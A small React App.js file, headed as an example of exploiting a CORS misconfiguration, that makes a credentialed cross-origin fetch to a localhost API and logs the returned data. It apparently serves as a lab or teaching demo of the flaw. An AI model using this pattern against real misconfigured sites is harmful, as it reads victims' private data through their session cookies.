import logo from './logo.svg';
import './App.css';

function App() {
  return (
    <div>
    <h1>Example for exploiting CORS Misconfiguration</h1>
    <p>Check your console for the API response.</p>
  </div>
  );
}
fetch("http://localhost:8080/api/File", {
      method: "GET",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
      },
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
      })
      .then((data) => {
        console.log("Data received from API:", data);
      })
      .catch((error) => {
        console.error("There was a problem with the fetch operation:", error);
      });

export default App;
